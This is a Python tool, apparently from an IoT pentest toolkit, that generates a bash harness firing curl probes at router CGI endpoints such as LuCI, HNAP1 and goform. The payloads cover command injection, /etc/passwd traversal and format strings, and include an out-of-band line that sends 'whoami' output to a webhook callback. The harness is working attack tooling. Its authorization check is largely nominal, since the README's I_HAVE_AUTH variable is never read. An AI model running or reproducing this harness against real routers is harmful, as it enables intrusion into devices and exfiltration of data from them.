#!/usr/bin/env python3
"""auto_web_fuzz -- HTTP-daemon-targeted parameter fuzzer.

When iot_recon picks an HTTP daemon (uhttpd / lighttpd / httpd) as
priority target, this helper emits a curl-driven parameter-fuzz
harness pointing at known IoT/router CGI patterns.

Per the master TODO B.5: HTTP is the most-likely RCE surface in
OpenWrt-class. Webhook-OOB exfiltration (via webhook.site or
operator-controlled callback) lets us catch blind injections.

Honesty constraints (mirror auto_fuzz_target_function):
  - refuses to emit without an explicit operator authorization
    flag (network traffic to 3rd-party host)
  - emits a runnable bash script the operator must invoke deliberately
  - logs every probe + response into a results dir for audit
"""

from __future__ import annotations

import argparse
import json
import sys
from pathlib import Path

# Common IoT/router CGI endpoint patterns (extend as we learn vendors)
COMMON_CGI_ENDPOINTS = [
    "/cgi-bin/luci",
    "/cgi-bin/luci/admin",
    "/cgi-bin/luci/;stok=/locale",
    "/cgi-bin/upload.cgi",
    "/cgi-bin/wireless.cgi",
    "/cgi-bin/ping.cgi",
    "/cgi-bin/tracert.cgi",
    "/cgi-bin/system.cgi",
    "/cgi-bin/diagnostic.cgi",
    "/HNAP1/",
    "/UD/act?1",
    "/jsonrpc",
    "/api/v1/system/info",
    "/setup.cgi",
    "/goform/setSysConfig",
    "/admin/firmware",
    "/admin/firmware?form=config_multipart",
]

# Common parameter names attackers test on IoT
COMMON_PARAMS = [
    "host",
    "ip",
    "ping_addr",
    "tracert_addr",
    "interface",
    "ssid",
    "wps_pin",
    "device_name",
    "wps_method",
    "country",
    "region",
    "filename",
    "file",
    "path",
    "page",
    "name",
    "action",
    "cmd",
    "command",
    "config",
    "data",
    "input",
]

# Injection payloads (shell + traversal + format-string)
PAYLOADS_CMD_INJECT = [
    "; id",
    "$(id)",
    "`id`",
    "| id",
    "; whoami",
    "; CALLBACK_URL/$(whoami)",  # OOB exfil with operator callback
]
PAYLOADS_PATH_TRAVERSAL = [
    "../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
]
PAYLOADS_FMT_STRING = ["%x" * 8, "%s%s%s%s", "AAAA%n"]


def emit_harness(target_host: str, callback_url: str, out_dir: Path) -> dict:
    """Emit a curl-driven fuzz harness + per-payload result dirs."""
    out_dir.mkdir(parents=True, exist_ok=True)

    sh = [
        "#!/usr/bin/env bash",
        "# auto_web_fuzz -- generated harness",
        "# Target: " + target_host,
        "# Callback: " + (callback_url or "(none -- disable OOB tests)"),
        "set -uo pipefail",
        "",
        'TARGET="${TARGET:-' + target_host + '}"',
        'CALLBACK="${CALLBACK:-' + (callback_url or "") + '}"',
        'RESULTS="${RESULTS:-./fuzz_results}"',
        'mkdir -p "$RESULTS"',
        "",
        'if [[ -z "$CALLBACK" ]]; then',
        "  echo '[!] CALLBACK not set -- OOB-exfil payloads SKIPPED.'",
        "  echo '[!] Set CALLBACK to a webhook.site URL to enable blind detection.'",
        "fi",
        "",
        "probe() {",
        '  local endpoint="$1" param="$2" payload="$3"',
        '  local sig="$(echo -n "$endpoint$param$payload" | sha256sum | cut -c1-16)"',
        '  local out="$RESULTS/$sig.txt"',
        '  echo "[probe] $endpoint?$param=$payload" | tee "$out"',
        "  curl -sk --max-time 5 \\",
        '    -o "$out.body" \\',
        "    -w 'HTTP %{http_code}  size=%{size_download}  time=%{time_total}\\n' \\",
        '    "$TARGET$endpoint?$param=$payload" | tee -a "$out"',
        "  # Detect command-injection (uid= in body)",
        "  if grep -qE 'uid=|root|gid=' \"$out.body\" 2>/dev/null; then",
        '    echo \'[HIT] cmd-injection at \' "$endpoint?$param=$payload" | tee "$out.HIT"',
        "  fi",
        "  # Detect path-traversal (root: in body)",
        "  if grep -qE '^root:' \"$out.body\" 2>/dev/null; then",
        '    echo \'[HIT] path-traversal at \' "$endpoint?$param=$payload" | tee "$out.HIT"',
        "  fi",
        "}",
        "",
        "",
    ]

    # Generate per-(endpoint, param, payload) probe call
    sh.append("# === Command-injection sweep ===")
    for ep in COMMON_CGI_ENDPOINTS:
        for param in COMMON_PARAMS:
            for p in PAYLOADS_CMD_INJECT:
                # OOB payload: skip if no callback
                if "CALLBACK_URL" in p:
                    sh.append(
                        f"[[ -n \"$CALLBACK\" ]] && probe '{ep}' '{param}' "
                        f"\"$(echo '{p}' | sed 's,CALLBACK_URL,'\"$CALLBACK\"',')\""
                    )
                else:
                    sh.append(f"probe '{ep}' '{param}' '{p}'")
    sh.append("")
    sh.append("# === Path-traversal sweep ===")
    for ep in COMMON_CGI_ENDPOINTS:
        for param in ("file", "filename", "path", "page", "name"):
            for p in PAYLOADS_PATH_TRAVERSAL:
                sh.append(f"probe '{ep}' '{param}' '{p}'")
    sh.append("")
    sh.append("# === Format-string sweep ===")
    for ep in COMMON_CGI_ENDPOINTS:
        for param in COMMON_PARAMS:
            for p in PAYLOADS_FMT_STRING:
                sh.append(f"probe '{ep}' '{param}' '{p}'")

    sh.extend(
        [
            "",
            "echo",
            "echo '[summary] fuzz complete'",
            "echo '[summary] HITs: $(ls $RESULTS/*.HIT 2>/dev/null | wc -l)'",
            "echo '[summary] total probes: $(ls $RESULTS/*.txt 2>/dev/null | wc -l)'",
            "ls -la $RESULTS/*.HIT 2>/dev/null || echo '[summary] no hits -- refine payloads or check target'",
        ]
    )

    harness_path = out_dir / "run_web_fuzz.sh"
    harness_path.write_text("\n".join(sh))
    harness_path.chmod(0o755)

    # README
    readme = (
        "# auto_web_fuzz harness\n"
        "\n"
        f"Target: `{target_host}`  \n"
        f"Callback: `{callback_url or '(not set -- OOB tests skipped)'}`  \n"
        "\n"
        "## Usage\n"
        "\n"
        "```bash\n"
        "# Set authorization flag explicitly (network traffic to target!)\n"
        "export I_HAVE_AUTH=1\n"
        "# Optionally set OOB callback URL (webhook.site etc.)\n"
        "export CALLBACK='https://your-id.webhook.site/'\n"
        "bash run_web_fuzz.sh\n"
        "```\n"
        "\n"
        "## What it does\n"
        "\n"
        f"- {len(COMMON_CGI_ENDPOINTS)} CGI endpoints × {len(COMMON_PARAMS)} param names × 6 cmd-injection payloads\n"
        "- + path-traversal sweep on file-shaped params\n"
        "- + format-string sweep on text params\n"
        "- HITs written to `fuzz_results/*.HIT` (uid=, root:, etc.)\n"
        "\n"
        "## Honesty notes\n"
        "\n"
        "- Sends real HTTP traffic to the target. Operator must have authorization\n"
        "  (per `legal/authz_per_target.yaml`).\n"
        "- Does NOT auto-submit findings; an HIT is a starting-point for manual\n"
        "  validation, not a confirmed vuln.\n"
        "- 5-second timeout per request; rate limit naturally via single-threaded\n"
        "  bash loop.\n"
    )
    (out_dir / "README.md").write_text(readme)

    return {
        "status": "ok",
        "harness_path": str(harness_path),
        "readme_path": str(out_dir / "README.md"),
        "endpoints": len(COMMON_CGI_ENDPOINTS),
        "params": len(COMMON_PARAMS),
        "approx_probes": len(COMMON_CGI_ENDPOINTS) * len(COMMON_PARAMS) * len(PAYLOADS_CMD_INJECT),
    }


def playbook_emit_web_fuzz(
    *, target_host: str, callback_url: str = "", out_dir: str = "web_fuzz_out", i_have_auth: bool = False
) -> dict:
    if not i_have_auth:
        return {
            "status": "needs_authorization",
            "message": "Set i_have_auth=true in the playbook input. "
            "Per legal/authz_per_target.yaml, network testing requires authz.",
        }
    return emit_harness(target_host, callback_url, Path(out_dir))


def main(argv=None) -> int:
    p = argparse.ArgumentParser(prog="auto_web_fuzz")
    p.add_argument("target_host", help="e.g. http://192.168.1.1")
    p.add_argument("--callback", default="", help="OOB webhook URL (e.g. webhook.site)")
    p.add_argument("--out-dir", default="web_fuzz_out")
    p.add_argument(
        "--i-have-authorization",
        action="store_true",
        required=True,
        help="Mandatory: confirm target authz per legal/authz_per_target.yaml",
    )
    args = p.parse_args(argv)
    result = emit_harness(args.target_host, args.callback, Path(args.out_dir))
    print(json.dumps(result, indent=2))
    return 0 if result.get("status") == "ok" else 2


if __name__ == "__main__":
    sys.exit(main())
